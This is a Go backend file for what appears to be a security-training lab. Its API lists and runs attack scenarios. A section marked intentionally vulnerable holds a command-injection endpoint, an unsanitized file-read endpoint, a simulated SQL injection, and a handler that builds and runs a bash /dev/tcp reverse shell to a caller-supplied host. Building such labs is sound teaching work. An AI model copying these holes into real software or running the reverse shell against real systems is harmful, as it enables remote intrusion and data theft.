package backend

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

// APIHandler handles all API endpoints
type APIHandler struct {
	tracker   *ExecutionTracker
	wsHandler *WebSocketHandler
}

// NewAPIHandler creates a new API handler
func NewAPIHandler() *APIHandler {
	tracker := NewExecutionTracker()
	wsHandler := NewWebSocketHandler(tracker)

	return &APIHandler{
		tracker:   tracker,
		wsHandler: wsHandler,
	}
}

// GetTracker returns the execution tracker
func (h *APIHandler) GetTracker() *ExecutionTracker {
	return h.tracker
}

// GetWebSocketHandler returns the WebSocket handler
func (h *APIHandler) GetWebSocketHandler() *WebSocketHandler {
	return h.wsHandler
}

// HandleGetAttacks returns all available attacks
func (h *APIHandler) HandleGetAttacks(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	response := map[string]interface{}{
		"attacks":    AllAttacks,
		"categories": GetAllCategories(),
		"count":      len(AllAttacks),
	}

	json.NewEncoder(w).Encode(response)
}

// HandleGetAttackByID returns a specific attack by ID
func (h *APIHandler) HandleGetAttackByID(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	// Extract ID from path: /api/attacks/{id}
	pathParts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/attacks/"), "/")
	if len(pathParts) == 0 || pathParts[0] == "" {
		http.Error(w, "Attack ID required", http.StatusBadRequest)
		return
	}

	attackID := pathParts[0]
	attack := GetAttackByID(attackID)

	if attack == nil {
		http.Error(w, "Attack not found", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(attack)
}

// HandleExecuteAttack executes an attack scenario
func (h *APIHandler) HandleExecuteAttack(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	w.Header().Set("Content-Type", "application/json")

	// Extract ID from path: /api/attacks/{id}/execute
	pathParts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/attacks/"), "/")
	if len(pathParts) < 2 {
		http.Error(w, "Invalid path", http.StatusBadRequest)
		return
	}

	attackID := pathParts[0]
	attack := GetAttackByID(attackID)

	if attack == nil {
		http.Error(w, "Attack not found", http.StatusNotFound)
		return
	}

	// Execute attack
	execution, err := h.tracker.ExecuteAttack(attack)
	if err != nil {
		http.Error(w, fmt.Sprintf("Execution failed: %v", err), http.StatusInternalServerError)
		return
	}

	// Return execution ID
	json.NewEncoder(w).Encode(map[string]interface{}{
		"execution_id": execution.ID,
		"attack_id":    attack.ID,
		"status":       execution.Status,
		"start_time":   execution.StartTime,
	})
}

// HandleGetExecution returns execution status and output
func (h *APIHandler) HandleGetExecution(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	// Extract ID from path: /api/executions/{id}
	pathParts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/executions/"), "/")
	if len(pathParts) == 0 || pathParts[0] == "" {
		http.Error(w, "Execution ID required", http.StatusBadRequest)
		return
	}

	executionID := pathParts[0]
	execution := h.tracker.GetExecution(executionID)

	if execution == nil {
		http.Error(w, "Execution not found", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(execution)
}

// HandleGetExecutions returns all executions
func (h *APIHandler) HandleGetExecutions(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	executions := h.tracker.GetAllExecutions()
	json.NewEncoder(w).Encode(map[string]interface{}{
		"executions": executions,
		"count":      len(executions),
	})
}

// HandleHealth returns health status
func (h *APIHandler) HandleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":    "healthy",
		"timestamp": time.Now().Format(time.RFC3339),
	})
}

// HandleSystemInfo returns system information
func (h *APIHandler) HandleSystemInfo(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	hostname, _ := os.Hostname()

	info := map[string]interface{}{
		"hostname":   hostname,
		"os":         runtime.GOOS,
		"arch":       runtime.GOARCH,
		"go_version": runtime.Version(),
		"timestamp":  time.Now().Format(time.RFC3339),
	}

	json.NewEncoder(w).Encode(info)
}

// ===== VULNERABLE ENDPOINTS (Phase 5) =====
// WARNING: These endpoints are INTENTIONALLY VULNERABLE for training purposes

// HandleVulnerableRCE - Intentionally vulnerable RCE endpoint
func (h *APIHandler) HandleVulnerableRCE(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")

	cmd := r.URL.Query().Get("cmd")
	if cmd == "" {
		http.Error(w, "Missing 'cmd' parameter", http.StatusBadRequest)
		return
	}

	log.Printf("[VULN-RCE] Command injection attempt: %s", cmd)

	// INTENTIONALLY VULNERABLE - Execute arbitrary command
	output, err := ExecuteVulnerableCommand(cmd)
	if err != nil {
		w.Write([]byte(fmt.Sprintf("Error: %v\n%s", err, output)))
		return
	}

	w.Write([]byte(output))
}

// HandleVulnerableLFI - Intentionally vulnerable Local File Inclusion
func (h *APIHandler) HandleVulnerableLFI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")

	file := r.URL.Query().Get("file")
	if file == "" {
		http.Error(w, "Missing 'file' parameter", http.StatusBadRequest)
		return
	}

	log.Printf("[VULN-LFI] File inclusion attempt: %s", file)

	// INTENTIONALLY VULNERABLE - No path sanitization
	content, err := os.ReadFile(file)
	if err != nil {
		w.Write([]byte(fmt.Sprintf("Error: %v", err)))
		return
	}

	w.Write(content)
}

// HandleVulnerableReverseShell - Guided reverse shell scenario
func (h *APIHandler) HandleVulnerableReverseShell(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	w.Header().Set("Content-Type", "application/json")

	var req struct {
		AttackerIP string `json:"attacker_ip"`
		Port       string `json:"port"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if req.AttackerIP == "" || req.Port == "" {
		http.Error(w, "Missing attacker_ip or port", http.StatusBadRequest)
		return
	}

	// Generate reverse shell payload
	payload := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", req.AttackerIP, req.Port)

	log.Printf("[VULN-REVERSE-SHELL] Reverse shell to %s:%s", req.AttackerIP, req.Port)

	// Execute in background
	go func() {
		_, _ = ExecuteVulnerableCommand(payload)
	}()

	// Return response
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "Reverse shell executed",
		"target":  fmt.Sprintf("%s:%s", req.AttackerIP, req.Port),
		"payload": payload,
		"message": "Check your listener for incoming connection",
	})
}

// HandleVulnerableSQL - SQL injection simulation
func (h *APIHandler) HandleVulnerableSQL(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	query := r.URL.Query().Get("search")
	if query == "" {
		http.Error(w, "Missing 'search' parameter", http.StatusBadRequest)
		return
	}

	log.Printf("[VULN-SQLI] SQL injection attempt: %s", query)

	// Simulate vulnerable SQL query (not actually executing SQL)
	vulnerableQuery := fmt.Sprintf("SELECT * FROM users WHERE username = '%s'", query)

	// Simulate SQL injection response
	if strings.Contains(strings.ToLower(query), "' or") ||
		strings.Contains(strings.ToLower(query), "union") ||
		strings.Contains(strings.ToLower(query), "--") {

		json.NewEncoder(w).Encode(map[string]interface{}{
			"vulnerability": "SQL Injection Detected",
			"query":         vulnerableQuery,
			"result":        "SQL injection successful - all users returned",
			"users": []map[string]string{
				{"username": "admin", "password": "5f4dcc3b5aa765d61d8327deb882cf99", "role": "administrator"},
				{"username": "user1", "password": "098f6bcd4621d373cade4e832627b4f6", "role": "user"},
				{"username": "serviceaccount", "password": "token:eyJhbGciOiJSUzI1NiIsImtpZCI...", "role": "service"},
			},
		})
		return
	}

	// Normal query (no injection)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"query":  vulnerableQuery,
		"result": "No users found",
	})
}
